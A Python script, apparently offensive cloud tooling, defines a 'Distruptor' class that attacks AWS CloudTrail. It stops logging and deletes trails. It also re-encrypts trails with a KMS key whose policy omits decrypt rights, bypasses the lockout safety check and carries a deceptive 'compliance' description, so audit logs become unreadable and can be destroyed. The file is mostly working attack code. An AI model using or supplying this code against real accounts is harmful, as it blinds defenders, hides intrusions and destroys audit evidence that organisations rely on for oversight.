import boto3
import inventory

class Distruptor(object):
    def __init__(self):
        self.client = boto3.client('cloudtrail', 'us-west-2')
        self.who = inventory.Who()
        self.account_id = self.who.identity['Account']
        self.user_id = self.who.identity['UserId']
        self.arn = self.who.identity['Arn']

    def stop_trail(self, name):
        response = self.client.stop_logging(
            Name = name
        )
        return response

    def delete_trail(self, name):
        response = self.client.delete_trail(
            Name= name
        )

    def encrypt_trail(self, name):
        response = self.client.update_trail(
            Name = name,
            KmsKeyId = self.generate_encrypt_only_key()
        )

    def generate_encrypt_only_key(self):
        policy = """{
          "Version": "2012-10-17",
          "Id": "Key policy created for CloudTrail",
          "Statement": [
            {
              "Sid": "Enable IAM User Permissions",
              "Effect": "Allow",
              "Principal": {
                "AWS": "USER_ARN"
              },
              "Action": [
                "kms:DisableKey",
                "kms:ScheduleKeyDeletion",
                "kms:GenerateDataKey*",
                "kms:DescribeKey"
              ],
              "Resource": "*"
            },
            {
              "Sid": "Allow CloudTrail to encrypt logs",
              "Effect": "Allow",
              "Principal": {
                "Service": "cloudtrail.amazonaws.com"
              },
              "Action": "kms:GenerateDataKey*",
              "Resource": "*",
              "Condition": {
                "StringLike": {
                  "kms:EncryptionContext:aws:cloudtrail:arn": "arn:aws:cloudtrail:*"
                }
              }
            },
            {
              "Sid": "Allow CloudTrail to describe key",
              "Effect": "Allow",
              "Principal": {
                "Service": "cloudtrail.amazonaws.com"
              },
              "Action": "kms:DescribeKey",
              "Resource": "*"
            }
          ]
        }"""

        policy = policy.replace("USER_ARN", self.arn)


        client = boto3.client('kms', 'us-west-2')
        #print policy
        response = client.create_key(
            Policy=policy,
            Description='Super important key for compliance stuff.',
            KeyUsage='ENCRYPT_DECRYPT',
            Origin='AWS_KMS',
            BypassPolicyLockoutSafetyCheck=True
        )
        return response['KeyMetadata']['KeyId']

if __name__ == '__main__':
    d = Distruptor()
    print d.generate_encrypt_only_key()
    #print d.who.identity
